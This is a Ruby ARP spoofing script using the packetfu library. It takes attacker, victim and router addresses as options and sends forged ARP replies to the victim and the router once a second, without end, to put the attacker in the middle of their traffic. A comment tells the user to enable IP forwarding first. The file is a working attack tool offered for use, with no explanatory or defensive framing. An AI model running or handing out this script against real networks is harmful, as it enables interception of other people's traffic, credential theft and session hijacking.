# Enable first packet forwading on your system
# echo "1" > /proc/sys/net/ipv4/ip_forward
$VERBOSE=nil
require 'packetfu'
require 'colorize'
require 'optparse'

OPTIONS = {}

# Parse options
parse = OptionParser.new do |ps|
  ps.banner = 'ruby arp_spoofing.rb --help'
  ps.separator ''
  ps.on('-o', '--output-name', 'Output file name') do |filename|
    OPTIONS[:filename] = filename
  end

  ps.on('-a', '--attacker-mac', 'Ataccker Mac') do |mac|
    OPTIONS[:ataccker_mac] = mac
  end

  ps.on('-vip', '--victim-ip', 'Victim IP') do |ip|
    OPTIONS[:victim_ip] = ip
  end

  ps.on('-vmac', '--victim-mac', 'Victim Mac') do |mac|
    OPTIONS[:victim_mac] = mac
  end

  ps.on('-rip', '--router-ip', 'Router IP') do |ip|
    OPTIONS[:router_ip] = ip
  end

  ps.on('-rmac', '--router-mac', 'Router Mac') do |mac|
    OPTIONS[:router_mac] = mac
  end

  ps.on('-i', '--interface ') do |interface|
    OPTIONS[:interface] = interface
  end
end

parse.parse!


attacker_mac = OPTIONS[:ataccker_mac]
victim_ip = OPTIONS[:victim_ip]
victim_mac = OPTIONS[:victim_mac]
router_ip = OPTIONS[:router_ip]
router_mac = OPTIONS[:router_mac]


info = PacketFu::Utils.whoami?(:iface => OPTIONS[:interface])

## Victim
# Build	Ethernet header
arp_packet_victim = PacketFu::ARPPacket.new
arp_packet_victim.eth_saddr	= attacker_mac
arp_packet_victim.eth_daddr	= victim_mac
arp_packet_victim.arp_saddr_mac = attacker_mac
arp_packet_victim.arp_daddr_mac = victim_mac
arp_packet_victim.arp_saddr_ip = router_ip
arp_packet_victim.arp_daddr_ip = victim_ip
arp_packet_victim.arp_opcode = 2

## Router
# Build	Ethernet header
arp_packet_router = PacketFu::ARPPacket.new
arp_packet_router.eth_saddr	= attacker_mac
arp_packet_router.eth_daddr	= router_mac
arp_packet_router.arp_saddr_mac	= attacker_mac
arp_packet_router.arp_daddr_mac	= router_mac
arp_packet_router.arp_saddr_ip	= victim_ip
arp_packet_router.arp_daddr_ip = router_ip
arp_packet_router.arp_opcode = 2 


while true
  sleep	1
  puts	"[+]	Sending	ARP	packet	to	victim:	#{arp_packet_victim.arp_daddr_ip}".red
  arp_packet_victim.to_w(info[:iface])
  puts	"[+]	Sending	ARP	packet	to	router:	#{arp_packet_router.arp_daddr_ip}".green
  arp_packet_router.to_w(info[:iface])
end